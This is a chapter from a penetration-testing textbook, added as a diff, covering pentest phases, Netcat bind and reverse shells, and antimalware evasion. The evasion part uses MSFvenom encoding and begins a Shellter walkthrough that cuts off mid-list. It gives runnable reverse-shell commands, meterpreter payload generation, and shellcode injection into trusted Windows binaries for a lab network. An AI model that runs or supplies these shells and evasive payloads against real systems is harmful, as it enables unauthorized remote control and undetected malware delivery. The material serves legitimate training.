@@ -1,0 +1,632 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xml:lang="en" lang="en">
+<head>
+<title>The Ultimate Kali Linux Book - Third Edition</title>
+<link rel="stylesheet" type="text/css" href="../styles/stylesheet1.css"/>
+<link rel="stylesheet" type="text/css" href="../styles/stylesheet2.css"/>
+</head>
+<body>
+<div id="book-content">
+<div id="sbo-rt-content"><section id="understanding-network-penetration-testing" class="level1 pkt" data-number="9">
+<h1 data-number="9">8 Understanding Network Penetration Testing</h1>
+<section id="join-our-book-community-on-discord-7" class="level2" data-number="9.1">
+<h2 data-number="9.1">Join our book community on Discord</h2>
+<p><a href="https://packt.link/SecNet">https://packt.link/SecNet</a><img src="../media/file321.png" alt="Qr code Description automatically generated" width="150" height="150"/>When breaking into the offensive side of cybersecurity, it’s essentials for aspiring ethical hackers and penetration testers to gain a solid understanding on the importance of network penetration testing and common techniques of setting up reverse and bind shells between a targeted system and their attacker machine. Furthermore, learning how to develop custom payloads and evade antimalware detection helps penetration testers to determine whether the cyber defense at a targeted organization has the capabilities of detecting malicious code over their network. In this chapter, you will learn about the importance of network penetration testing and how it helps organizations to identify hidden security vulnerabilities on their assets and to better understand how an adversary is able to compromise their systems. Furthermore, you’ll gain the hands-on experience on working with both bind and reverse shells between your attacker machine and a targeted system. In addition, you’ll learn how to develop and conceal malicious payloads to evade antimalware programs. Lastly, you’ll learn how to work with wireless network adapters and use them for monitoring wireless systems within the vincity. In this chapter, we will cover the following topics:</p>
+<ul>
+<li>Introduction to network penetration testing</li>
+<li>Working with bind and reverse shells</li>
+<li>Antimalware evasion techniques</li>
+<li>Working with wireless adapters</li>
+<li>Managing and monitoring wireless modes</li>
+</ul>
+<p>Let’s dive in!</p>
+</section>
+<section id="technical-requirements-6" class="level2" data-number="9.2">
+<h2 data-number="9.2">Technical Requirements</h2>
+<p>To follow along with the exercises in this chapter, please ensure that you have met the following hardware and software requirements:</p>
+<ul>
+<li>Kali Linux - <a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></li>
+<li>Shelter - <a href="https://www.shellterproject.com/introducing-shellter/">https://www.shellterproject.com/introducing-shellter/</a></li>
+<li>Alfa AWUS036NHA Wireless B/G/N USB adapter</li>
+<li>Alfa AWUS036ACH Long-Range Dual-Band AC1200 Wireless USB 3.0 Wi-Fi adapter</li>
+</ul>
+<p>Not all wireless network adapters support monitoring mode and packet injection. Sometimes, a vendor makes a minor revision to a chipset version on their product which prevents the wireless network adapter from operating in monitoring mode on the penetration tester’s machine. In addition, some wireless network adapters may not work out-of-the-box and require you to download and compiled the drivers on your Kali Linux machine.</p>
+</section>
+<section id="introduction-to-network-penetration-testing" class="level2" data-number="9.3">
+<h2 data-number="9.3">Introduction to network penetration testing</h2>
+<p>Network penetration testing is the systematic approach and techniques used by ethical hackers and penetration testers to simulate a real-world cyber-attack on a targeted organization, its systems and networks, with the intention of discovering hidden security vulnerabilities and providing recommendations for implementing countermeasures and security controls to mitigate and prevent a real adversary from compromising the organization and its assets. During the technical phases of network penetration testing, the ethical hacker or penetration tester uses similar <strong>Tactics, Techniques and Procedures</strong> (<strong>TTPs</strong>) as a real adversary to test the cyber defensives, monitoring and prevention techniques of the organization’s security team, and to identify security flaws on targeted systems. Based on the finding during the technical phases of the penetration test, the information collected can be leverage to better understand how a real attacker will discover security flaws, the method of attack, possible tools and infrastructure used to setup the attack and deliver a payload to the target, and the potential impact of a real attack were to occur on the organization’s systems and network. Such information is commonly referred to <strong>Cyber Threat Intelligence</strong> (<strong>CTI</strong>). This data is used by the penetration tester to provide insights to stakeholders on their cyber risk, types of security vulnerabilities and their severity ratings, and what can be done to resolve the security vulnerabilities while improving the organization’s security posture.The following are typical phases of network penetration testing:</p>
+<ol>
+<li>Define the scope – The scope provides a clear understanding of which systems and networks are to be tested and whether specific tools or techniques are restricted.</li>
+<li>Performing reconnaissance – This is the information gathering phase where the penetration tester performs both passive and active reconnaissance on the target.</li>
+<li>Scanning and enumeration – The scanning and enumeration phase is commonly used to collect specific details information about the target such as open ports, running services, operating system, identify user accounts, network shares and configurations on targeted systems.</li>
+<li>Vulnerability analysis – During this phase, the penetration tester analyzes the collected data from the previous phases to identify any potential security vulnerabilities on the target, determine their severity and risk rating, and countermeasures to help the organization improve their cyber defensives.</li>
+<li>Exploitation – In this phase, the ethical hacker or penetration tester attempts to exploit each security vulnerability found on a targeted system using both manual and automated techniques to determine whether the security vulnerability actual exists and gain a foothold on the target.</li>
+<li>Post-exploitation – Once a targeted system is compromised, the penetration tester will attempt to expand their foothold further into the compromised system and onto other systems within scope. During this phase, the penetration tester can identify additional security vulnerabilities on the target.</li>
+<li>Reporting – This reporting is one of the most important phases during any penetration test. The penetration tester is required to provide a detailed technical and executive report to the stakeholders of the targeted organization with information about the security assessment, the techniques used to discover the security vulnerabilities, the security vulnerabilities that were found and recommendations on how to improve the security posture of the targeted system.</li>
+<li>Remediation – Based on the information in the report, the organization can implement the necessary steps needed to remediate the identified security vulnerabilities on the targeted system. The process may involve applying security controls, patches, and improving the configuration on systems and devices.</li>
+</ol>
+<p>Network penetration testing provides a lot of advantages for organizations, such as helping companies stay ahead of cyber criminals by proactively identifying security vulnerabilities on their assets, while determining how a real attacker will be able to compromise targeted systems and using the insights to improve and harden their systems and network infrastructure. Furthermore, vulnerability analysis helps organizations to better prioritize their resources into implementing remediation such as countermeasures to address most critical security vulnerabilities first. For instance, a system with a security vulnerability risk rating of 8 should be prioritized over a system with a lower severity rating such as 3. However, it's important to consider whether each of these systems are connected directly to the internet or on an internal network. While some professionals may argue that the severity risk rating should take precedence, it’s important to note that a critical system that’s directly connected to the internet with a lower severity rating may be prioritized because an external threat actor has direct connectivity to the system as compared to an internal system.Each day, many organizations are reporting data breaches. Network penetration testing helps organizations take a proactive approach in identifying and resolving security vulnerabilities, therefore reducing the risk of a real cyber-attack in the future. In addition, this helps organizations thoroughly assess their cyber defensives and determine whether their systems networks and infrastructure is compliant with various industry standards and frameworks. For instance, organizations that process a payment card system are required to be <strong>Payment Card Industry Data Security Standard</strong> (<strong>PCI DSS</strong>) compliant to provide sensitive data during a payment transaction. While many organizations are continuously working on improving their cybersecurity strategies, performing network penetration testing helps the organization to measure their incident response and handling preparedness of their security team. If organizations are unable to efficiently identify and respond to security incidents, the threat actor will be able to expand their foothold on the compromised network and potentially cause more damages to the organization. Another important benefit of performing regular security assessments is helping organizations stay ahead of new and emerging threats in the wild. While many organizations have a patch management system, network penetration testing helps organizations to determine whether there are any inefficiencies in the patch management process and if there are any security vulnerabilities on their systems which can be exploited by a cyber-criminal.Over the next few sections, you will learn about the importance of bind and reverse shells, and how they can be leveraged by ethical hackers and penetration testers.</p>
+</section>
+<section id="working-with-bind-and-reverse-shells" class="level2" data-number="9.4">
+<h2 data-number="9.4">Working with bind and reverse shells</h2>
+<p><strong>Bind shells</strong> are commonly used by penetration testers to logically bind a service port on a targeted system to await an incoming connection, this is commonly referred to as a <em>listener</em>. For instance, imagine your target is a vulnerable server on the internet with a public IP address, while your attacker machine such as Kali Linux is behind a router or firewall with <strong>Network Address Translation</strong> (<strong>NAT</strong>) enabled. Furthermore, if there’s a firewall between the source and destination, firewalls are usually configured to allow outbound traffic from their internal network to the internet, but not vice versa. Therefore, if a device on the internet initiates a connection to a system on a private network, the NAT-enabled router or firewall will automatically terminate (close/block) the connection for security reasons.</p>
+<blockquote>
+<p>On a NAT-enabled router, the private source IPv4 address is translation into the public IPv4 address on the internet-facing interface on the router before it’s sent on the internet. This means, internet-connection devices will see the sender’s address as the public IPv4 address on the router or modem, and not the private IPv4 address of the client on the private network. NAT prevent direct connections between source and destination devices.</p>
+</blockquote>
+<p>The following are common attributes of bind shell for penetration testers:</p>
+<ul>
+<li>Bind shells are shells which are bind to a specific port to create a listener for incoming connections from a remote machine.</li>
+<li>When a remote machine established a connection to the targeted system that is running the listener on the specific bind port, a shell is spawned between the remote machine and the targeted system. Therefore, providing remote access to the targeted system.</li>
+<li>Bind shells are commonly used by penetration testers when the IP address of the targeted system is known and a listener can be configured on it.</li>
+</ul>
+<p>If a penetration tester is able to compromise a vulnerable system on the internet, a listener can be bound to the Windows Command Prompt or a Linux shell with the targeted system’s IP address and bind port number. This enables the penetration tester to remote connect to the targeted system via its public IP address and bind port number, and obtain a bind shell on the target.The following diagram shows a visual representation of a bind shell between an attacker’s machine and a targeted system:</p>
+<img src="../media/file322.png" width="758" height="304"/>
+<p>As shown in the preceding diagram, the attacker machine such as Kali Linux is located on a private network and it’s behind a firewall that’s configured to performing outbound traffic to the internet. However, the penetration tester wants to establish a remote shell to the targeted system on the internet. Therefore, the penetration tester needs to compromise the targeted system and setup a listener on the public IP address and a port number on the target.The penetration tester can use Netcat, Ncat and even Metasploit to setup bind shells between a target and attacker machines. These are common tools within the cybersecurity industry that’s great for binding an IP address and port number for listeners. Keep in mind, once a shell is established between system, the penetration tester will be able to remote execute commands on the targeted system over a network.<strong>Reverse shell</strong> is another technique commonly used by penetration testers to setup a call-back session from a compromised system to the attacker machine. Unlike bind shells, penetration testers set up a listener on their attacker machine, then sends instructions to the targeted system to establish a call-back session to the listener. For instance, imagine you’ve compromised a targeted system on an internal network and you have another attacker machine that’s running on a cloud with a public IP address. If you attempt to establish a connection between the attacker machine that’s hosted on the cloud to the targeted system on a private network, the targeted organization’s router or firewall will automatically terminate the session.Using a reverse shell, the penetration tester can configure the listener on the attacker machine on the cloud and send instructions to the targeted machine to establish a connection the listener server, as shown in the following diagram:</p>
+<img src="../media/file323.png" width="759" height="306"/>
+<p>The following are common attributes of bind shell for penetration testers:</p>
+<ul>
+<li>Penetration testers setup a listener on the attacker machine and sends instructions to the targeted system to establish a call-back session.</li>
+<li>When the targeted system establish a session to the listener on the attacker machine, a shell is spawned which enables the penetration tester to remotely execute commands on the target.</li>
+<li>Reverse shells are commonly used when the penetration tester does not have direct access to the targeted machine that’s behind a NAT-enable router or firewall. Therefore, it’s less complex for the compromised system to establish an outbound connection to the internet.</li>
+</ul>
+<p>In the next few sub-sections, you will learn how to create both bind and reverse shells using various tools.</p>
+<section id="remote-shells-using-netcat" class="level3" data-number="9.4.1">
+<h3 data-number="9.4.1">Remote shells using Netcat</h3>
+<p>In this exercise, you will learn the fundamentals of working with remote shells using Netcat. Netcat is a multi-purpose toll that enables IT professionals to create a network connection between multiple systems using <strong>Transmission Control Protocol/Internet Protocol</strong> (<strong>TCP/IP</strong>). In addition, you will learn how to setup a listener to capture incoming connection from a remote device over a network.Before proceeding further, please ensure you use the following guidelines:</p>
+<ul>
+<li>Kali Linux is the attacker machine with a network adapter connected on <code>192.168.42.0/24</code> (RedTeamLab) network.</li>
+<li>Bob-PC will operate as the targeted host which is also connected to the <code>192.168.42.0/24</code> (RedTeamLab) network.</li>
+<li>Use the local administrator account to login to Bob-PC. Please see <em>Chapter 3 - Setting up for Advanced Penetration Testing Techniques</em> for the user credentials.</li>
+<li>Kali Linux will run Netcat as a listener to capture any incoming connections, while Bob-PC will be used to establish the Netcat session to Kali Linux.</li>
+</ul>
+<p>To get started on remote shells using Netcat, please use the following instructions:</p>
+<ol>
+<li>Power-on the <strong>Kali Linux</strong> virtual machine, open the <strong>Terminal</strong> and use the <code>ip address</code> or <code>ifconfig</code> command to identify which interface is connected to the <code>192.168.42.0/24</code> network and it’s host address, as shown below:</li>
+</ol>
+<img src="../media/file324.png" width="1279" height="262"/>
+<p>As shown in the preceding screenshot, Kali Linux has the <code>192.168.42.27</code> address on its <code>eth2</code> interface that’s connected to the <code>192.168.42.0/24</code> network.</p>
+<ol>
+<li>Within Kali Linux, there are set of pre-loaded Windows binary files which are useful to ethical hackers and penetration testers. One of these Windows-based binaries is <strong>Netcat</strong> for Windows. Let’s setup a Python-based web server on our Kali Linux virtual machine to transfer the Netcat file to the targeted system. On <strong>Kali Linux</strong>, use the following commands to setup a web server within the Windows binaries directory:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ cd /usr/share/windows-binaries
+kali@kali:/usr/share/windows-binaries$ python3 -m http.server 8080</code></pre>
+</div>
+<p>Once the Python web server is running within <code>/usr/share/windows-binaries</code> directory, any user that connects to Kali Linux on port <code>8080</code> will be able to view and download files from the directory.</p>
+<ol>
+<li>Next, power-on <strong>Bob-PC</strong> virtual machine and login with the local administrator account. On the logon screen, click on <strong>Other User</strong>, enter username: <code>Bob-PC\bob</code> and password: <code>P@ssword2</code> as shown in the following screenshot:</li>
+</ol>
+<img src="../media/file325.png" width="1040" height="784"/>
+<ol>
+<li>On <strong>Bob-PC</strong>, open the web browser and connect to <code>http://&lt;Kali-Linux-address&gt;:8080</code> and download the <strong>nc.exe</strong> file, as shown below:</li>
+</ol>
+<img src="../media/file326.png" width="715" height="433"/>
+<p>After downloading the <strong>nc.exe</strong> file, copy/move it to the <code>C:\Windows\System32</code> directory within <strong>Bob-PC</strong>. After the downloading the file, you can quit the Python web server by pressing <code>CTRL + Z</code> on the keyboard.</p>
+<ol>
+<li>Next, to setup a Netcat listener on port <code>1234</code>, use the following commands on <strong>Kali Linux</strong>:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ nc -nlvp 1234</code></pre>
+</div>
+<p>The following is a breakdown of the preceding commands:</p>
+<ul>
+<li><code>-n</code>: Specifies to use the IP address only and do not perform Domain Name System (DNS) queries.</li>
+<li><code>-l</code>: Specifies to listen for incoming connections.</li>
+<li><code>-v</code>: Specifies to use verbose mode.</li>
+<li><code>-p</code>: Specific the listening port number</li>
+</ul>
+<ol>
+<li>Next, on <strong>Bob-PC</strong>, open the <strong>Command Prompt</strong> and use the following commands to establish a Netcat connection to Kali Linux:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>C:\Users\bob&gt; nc -nv 192.168.42.27 1234</code></pre>
+</div>
+<ol>
+<li>Once the session is established from <strong>Bob-PC</strong> (client) to <strong>Kali Linux</strong> (listener/server), you can enter messages on either systems and it will be sent over to the other end, as shown here:</li>
+</ol>
+<img src="../media/file327.png" width="1371" height="667"/>
+<p>As shown in the preceding screenshot, messages were entered on Bob-PC and were received on the Netcat listener on Kali Linux.</p>
+<ol>
+<li>To terminate the session, use <code>CTRL + Z</code> key combinations on the keyboard</li>
+</ol>
+<p>In this exercise, you’ve learnt how to establish a remote shell between two host machines and establish a communication channel. While this is a basic technique, it provides some practical insights into how remote shells operate between hosts on a network. Next, you will learn how to establish a bind shell using Netcat.</p>
+</section>
+<section id="setting-up-a-bind-shell" class="level3" data-number="9.4.2">
+<h3 data-number="9.4.2">Setting up a bind shell</h3>
+<p>In this exercise, you will learn how to bind the Linux native shell, the <strong>Bourne Again SHell</strong> (<strong>BASH</strong>) into a listener. This technique enables a remote host to establish a network connection and execute remote commands on a Netcat server.To get started with setting up a bind shell, please use the following instructions:</p>
+<ol>
+<li>Power-on the <strong>Kali Linux</strong> virtual machine, open the <strong>Terminal</strong> and use the following commands to a create a Netcat listener that binds the native BASH shell to the listener:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ nc -nlvp 1234 -e /bin/bash</code></pre>
+</div>
+<blockquote>
+<p>If setting up the listener on a Microsoft Windows system, the <code>nc -nlvp 1234 -e cmd.exe</code> command will enable you to bind the Windows Command Prompt to the listener using Netcat.</p>
+</blockquote>
+<ol>
+<li>Next, power-on <strong>Bob-PC</strong> virtual machine and login with the local administrator account (<code>Bob-PC\bob</code> | <code>P@ssword2</code>). Then, open the <strong>Command Prompt</strong> and use the following commands to establish a Netcat session to Kali Linux (listener):</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>C:\Users\bob&gt; nc -nv 192.168.42.27 1234 </code></pre>
+</div>
+<ol>
+<li>Once a session is established from Bob-PC to Kali Linux, you’ll be able to enter Linux-based commands on the Windows Command Prompt and they’ll be executed remotely on Kali Linux, as shown below:</li>
+</ol>
+<img src="../media/file328.png" width="755" height="256"/>
+<p>As shown in the preceding screenshot, the <code>whoami</code> command was entered on the bind shell, executed remotely on Kali Linux and the results are returned. Similarly, the <code>pwd</code> command was used to determine the present work directory of the bind shell on Kali Linux.</p>
+<blockquote>
+<p>To get a Linux Terminal interface when using a bind shell, use the <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> command.</p>
+</blockquote>
+<p>Having completed this exercise, you have learnt how to setup a bind shell on a system running a Netcat listener, enabling a remote user to establish a connection to the Netcat listener and obtain a remote bind shell on the targeted system and performing remote command execution. Next, you will learn how to setup reverse shells between hosts over a network.</p>
+</section>
+<section id="setting-up-reverse-shells" class="level3" data-number="9.4.3">
+<h3 data-number="9.4.3">Setting up reverse shells</h3>
+<p>In this exercise, you will learn how to setup a reverse shell from a targeted system back to your attacker machine over a network. We’ll be using Bob-PC as the targeted system which will initiate the reverse connection to our attacker machine which will be Kali Linux.To get started with this exercise, please use the following instructions:</p>
+<ol>
+<li>Power-on the <strong>Kali Linux</strong> virtual machine, open the <strong>Terminal</strong> and use the following commands to setup a Netcat listener to capture any incoming connections:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ nc -nlvp 1234</code></pre>
+</div>
+<ol>
+<li>Next, power-on <strong>Bob-PC</strong> and login with the local administration account, username: <code>Bob-PC\bob</code> and password: <code>P@ssword2</code>.</li>
+<li>On <strong>Bob-PC</strong>, open the <strong>Command Prompt</strong> and use the following commands to create a reverse connection to the listener on Kali Linux, while sending the Command Prompt shell to Kali Linux:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>C:\Users\bob&gt; nc -nv 192.168.42.27 1234 -e cmd.exe</code></pre>
+</div>
+<blockquote>
+<p>If you are using a Linux-based system as the client, use the <code>nc –nv 10.1.1.2 9999 -e /bin/bash</code> command to bind the Linux bash shell to the Netcat connection.</p>
+</blockquote>
+<p>The following screenshot shows Bob-PC was able to establish a connection to the Netcat listener on Kali Linux:</p>
+<img src="../media/file329.png" width="677" height="209"/>
+<ol>
+<li>On the Kali Linux virtual machine, you’ll now have a reverse shell from the Windows machine (Bob-PC) on the Linux Terminal as shown below:</li>
+</ol>
+<img src="../media/file330.png" width="995" height="335"/>
+<p>As shown in the preceding screenshot, the Window machine was able to successfully connect to the Netcat listener and provide the local shell, enabling the remote user on Kali Linux to perform remote command execution.Having completed this section, you have learned how to create a reverse shell using Netcat. However, keep in mind that Netcat does not encrypt messages between the Netcat client and server, which can lead to detection. However, it's worth noting that both Ncat and Socat can be used to provide data encryption between host systems when working with remote shells. In the next section, you will learn how to create customized reverse shell payloads and implement antimalware evasion techniques.</p>
+</section>
+</section>
+<section id="antimalware-evasion-techniques" class="level2" data-number="9.5">
+<h2 data-number="9.5">Antimalware evasion techniques</h2>
+<p>As an aspiring ethical hacker and penetration tester, you’ll be developing custom payloads that’s designed for specific targets, such as systems running Windows and Linux-based operating systems. In addition, if you’re performing mobile penetration testing, you’ll be creating payloads for mobile-based operating systems such as Android and iOS. More importantly, you’ll need to consider whether your targeted systems as running any antimalware programs that’s designed to detect and prevent any malicious code on the host. If a targeted system has an antimalware application installed, either it’s a native application such as Microsoft Defender Antivirus (sometimes referred to as Windows Defender) or a commercial solution, they are designed to detect and block any malicious code, application or service from running on the host system. This means, there’s a very high possibility the antimalware solutions on your targeted systems may detect your custom payload as malicious code and block it while notifying your target. There are various tools and techniques which are commonly used by cybersecurity professionals such as penetration testers to determine whether their custom payloads can bypass threat detection solutions such as antimalware on a targeted system. In addition, penetration testers usually create custom payloads to establish reverse connections from the targeted system back to their machine, and to escalate their user privileges after gaining a foothold onto the target. Therefore, its essentials to gain a solid understanding on various techniques that are used by antimalware solutions to identify potential threats and suspicious activities to improve the development of custom payloads to evade detection.Since antimalware vendors are continuously improving their solutions to detect and block new and emerging threats in the wild (internet), ethical hackers and penetration testers need to ensure their custom payloads can evade detection, else it’ll be immediately quarantined or deleted upon detection.This is section is neither intended to for advanced learners nor it focuses on advanced evasion techniques, but provides an introductory to common evasion techniques for penetration testers. However, this section is designed to provide the fundamentals for threat identification techniques of common antimalware solutions, as well as how to use evasive techniques when developing custom payloads for penetration testing.The following are various techniques used by antimalware solutions to detect potential threats in a system and network:</p>
+<ul>
+<li><strong>Signature-based</strong>: Signature-based detection is one of the most common and perhaps an older technique that's used by threat detection and prevention systems such as antimalware, <strong>Intrusion Detection System</strong> (<strong>IDS</strong>) and <strong>Intrusion Prevention System</strong> (<strong>IPS</strong>). This technique enables the antimalware engine to look for matching code or patterns within a file, application, or network traffic. Once a match has been found, an alert is triggered and the antimalware applications takes action to prevent the threat from expanding its foothold on the system or network.</li>
+</ul>
+<p>The disadvantage of using signature-based detection is the antimalware solution relies on knowing the signature to identify the malware. For instance, if a new threat emerges on the internet and the antimalware solution does not have a matching signature, the threat can invade the organization and its systems without any detection until the threat intelligence team of antimalware vendor detects, analyzes and pushes an update with the new signature to their solutions. Hence, it’s important for organizations to ensure their threat detection and prevention solutions has an active license (if needed) and has the latest updates from the vendor.</p>
+<ul>
+<li><strong>Behavioral-based</strong>: In behavioral-based threat detection, if an antimalware solution detects a file and application on a host system to be operating outside it’s normal parameters, it is usually placed within a sandbox environment for further observation and analysis to determine whether is a threat. Within the sandbox environment, the suspicious or potentially harmful application is executed within a virtualized space, which enables the antimalware program to take a deeper look for any real potential threats or dangers before allowing it to run on the host’s memory space.</li>
+<li><strong>Heuristic-based</strong>: In heuristic-based threat detection, the antimalware program usually need pre-defined rules to help it determine whether a file or application is harmful to the system or network. Furthermore, algorithms are also used to determine whether the executable file or running application has any malicious code within its instructions that have the potential to cause harm or data loss on the host system.</li>
+</ul>
+<p>The following are common online platforms for performing static malware analysis:</p>
+<ul>
+<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
+<li><a href="https://cuckoo.cert.ee/">https://cuckoo.cert.ee/</a></li>
+<li><a href="https://app.any.run/">https://app.any.run/</a></li>
+</ul>
+<p>While antivirus and antimalware vendors usually implement one or more of these preceding techniques, the cybersecurity industry is continuously evolving, with new detection methods being available in antimalware software. In the following subsections, you will learn how to create custom payloads using various antimalware evasion techniques.</p>
+<section id="encoding-payloads-with-msfvenom" class="level3" data-number="9.5.1">
+<h3 data-number="9.5.1">Encoding payloads with MSFvenom</h3>
+<p><strong>Metasploit Framework Venom</strong> (<strong>MSFvenom</strong>) is commonly used by penetration testers to craft custom payloads for performing exploitation, <strong>Remote Code Execution</strong> (<strong>RCE</strong>), and privilege escalation on targeted systems. In addition, this tool enables the penetration tester to perform encoding and obfuscation to the payload to evade threat detection systems such as IDS and IPS.To get started using MSFvenom for generating and encoding custom payloads, please use the following instructions:</p>
+<ol>
+<li>Firstly, power-on the <strong>Kali Linux</strong> virtual machine and login to the desktop.</li>
+<li>Next, open the <strong>Terminal</strong> and use either the <code>ip address show eth1</code> or <code>ifconfig eth1</code> commands to determine the IP address of the <code>eth1</code> adapter on Kali Linux, as shown below:</li>
+</ol>
+<img src="../media/file331.png" width="1149" height="332"/>
+<p>The IP address from the network adapter will be used in the next step to indicate the call-back address or local host address when generating the custom payload.</p>
+<ol>
+<li>Next, use the following commands to generate a reverse shell payload:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.50 LPORT=1234 -f exe -o payload1.exe</code></pre>
+</div>
+<p>The following is a breakdown of all the parameters used in the preceding line of commands:</p>
+<ul>
+<li><code>-p</code> – Enables you to specify the payload. The <code>msfvenom --list payloads</code> commands displays a list of all supported payloads for MSFvenom.</li>
+<li><code>LHOST</code> – Allows you to specific the call-back address such as the IP address of Kali Linux as the attacker machine.</li>
+<li><code>LPORT</code> – Specifies the listening port on the attacker machine, this port needs to be open before executing the payload on the targeted system.</li>
+<li><code>-f</code> – This syntax is used to specifies the output format. The <code>msfvenom --list formats</code> command displays a list of supported output formats.</li>
+<li><code>-o</code> – Specifies the names of the output file. By default, the payload is stored within the present working directory, use the <code>pwd</code> command to verify the current directory.</li>
+</ul>
+<p>The following screenshot shows the custom payload was generated successfully:</p>
+<img src="../media/file332.png" width="1661" height="264"/>
+<ol>
+<li>Next, open the web browser within Kali Linux, go to <a href="https://www.virustotal.com">https://www.virustotal.com</a>, and upload the new generated payload to determine its detection status, as shown below:</li>
+</ol>
+<img src="../media/file333.png" width="1143" height="612"/>
+<p>As shown in the preceding screenshot, over 50 antimalware sensors from multiple vendors detected the custom payload as a potential threat. If we were to upload this custom payload to a targeted system that’s running any of these antimalware programs, it would be immediately detected and deleted. Hence, preventing us from executing the payload to obtain a reverse shell.</p>
+<blockquote>
+<p>Keep in mind that once you've submitted a file to VirusTotal and it has been flagged as malicious, the hash of the malicious file is also shared with other antivirus and security vendors within the industry. Therefore, the time to use your malicious payload is drastically reduced on your target.</p>
+</blockquote>
+<ol>
+<li>Next, let’s apply encoding to the payload using the <code>shikata_ga_nai</code> encoding module and perform 20 iterations of the encoding to reduce the threat detection rating of the custom payload, use the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.50 LPORT=1234 -e x86/shikata_ga_nai -i 20 -f exe -o payload2.exe</code></pre>
+</div>
+<ol>
+<li>After the new payload is generated, upload it to VirusTotal to determine the threat detection, as shown below:</li>
+</ol>
+<img src="../media/file334.png" width="1142" height="617"/>
+<p>As shown in the preceding screenshot, while this new custom payload contains 20 iterations of encoding using the <code>x86/shikata_ga_nai</code> encode module, it was still detected by many antimalware sensors. However, the <code>x86/shikata_ga_nai</code> encoder module is mostly recommended when using MSFvenom.</p>
+<ol>
+<li>Next, let’s generate another custom payload and embed it within an executable file, using the following commands:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.50 LPORT=1234 -x /usr/share/windows-binaries/whoami.exe -e x86/shikata_ga_nai -i 20 -f exe -o payload3.exe</code></pre>
+</div>
+<ol>
+<li>Next, upload the new payload to VirusTotal to determine the threat rating, as shown below:</li>
+</ol>
+<img src="../media/file335.png" width="1141" height="626"/>
+<p>As shown in the preceding screenshot, the <code>payload3.exe</code> file has a lower detection rating as compared to the previous custom payloads. It’s important to enumerate running services and applications on a targeted system to determine whether the host is running a specific antimalware solution, then test the payload in a lab environment to ensure it’s working as expected before delivering to the target.Having completed this exercise, you have learned how to reduce threat detection ratings using MSFvenom by generating payloads. Next, you will learn how to use Shellter to create payloads that can't be detected as easily by antimalware programs.</p>
+</section>
+<section id="creating-custom-payloads-with-shellter" class="level3" data-number="9.5.2">
+<h3 data-number="9.5.2">Creating custom payloads with Shellter</h3>
+<p><strong>Shellter</strong> is an antimalware evasion tools that’s commonly used by ethical hackers and penetration testers to automate the process of creating and encoding custom payloads to evade threat detection systems. Shelter handles the generation of shellcode and injecting it into a trusted Microsoft Windows 32-bit application. When the custom payload is executed on a targeted system, the trusted files are executed as if the application is benign but the custom payload (shellcode) is executed in the background within the memory space.To get started generating custom payloads with Shellter, please use the following instructions:</p>
+<ol>
+<li>Power-on the <strong>Kali Linux</strong> virtual machine and login to the desktop.</li>
+<li>Next, open the <strong>Terminal</strong> (#1) and use the following commands to install <strong>Shellter</strong>:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo apt update
+kali@kali:~$ sudo apt install shelter</code></pre>
+</div>
+<ol>
+<li>Next, use the following commands to setup and configure the working environment for <strong>Shellter</strong> and install <strong>Wine32</strong>:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo dpkg --add-architecture i386
+kali@kali:~$ sudo apt update
+kali@kali:~$ sudo apt install wine32</code></pre>
+</div>
+<ol>
+<li>Next, use the following commands to list a set of common Windows binaries on Kali Linux:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ ls -l /usr/share/windows-binaries/</code></pre>
+</div>
+<p>As shown in the following screenshot, there are useful binaries which can be useful for ethical hackers and penetration testers:</p>
+<img src="../media/file336.png" width="881" height="511"/>
+<ol>
+<li>Next, let’s use the following commands to copy the <code>vncviewer.exe</code> file to our current working directory:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ cp /usr/share/windows-binaries/vncviewer.exe /home/kali </code></pre>
+</div>
+<p>Additionally, the <code>cp /usr/share/windows-binaries/vncviewer.exe /home/kali ./</code> command can be used to copy the file to the present working directory without having the need to specific the entire output directory.Since we’ve installed additional packages onto Kali Linux during the previous steps, consider to logging-off and re-login to ensure the latest packages are applied.</p>
+<ol>
+<li>Next, use the following commands to launch the Shellter application on Kali Linux:</li>
+</ol>
+<div class="C1-ConsolePACKT">
+<pre><code>kali@kali:~$ sudo shelter</code></pre>
+</div>
+<ol>
+<li>Next, when the Shellter window appears, you’ll be provided with the options to use Shellter in automatic or manual mode, type <code>A</code> and hit <code>Enter</code> to apply automatic mode, as shown below:</li>
+</ol>
+<img src="../media/file337.png" width="601" height="272"/>
+<ol>
+<li>Next, Shellter will require a <strong>Portable Executable</strong> (<strong>PE</strong>) file. Specify the <code>vncviewer.exe</code> file within the <code>/home/kali</code> directory as shown below:</li>
+</ol>
+<img src="../media/file338.png" width="600" height="287"/>
+<ol>
+<li>Shellter will determine where it can inject shellcode within the PE file. Once this process is completed, type <code>Y</code> and hit <code>Enter</code> to enable stealth mode, as shown below:</li>
+</ol>
+<img src="../media/file339.png" width="600" height="384"/>
+<ol>
+<li>Next, configure the payload to be attached to the PE file, use the following configurations:
+<ul>
+<li>Choose <code>L</code> for the listed payload.</li>
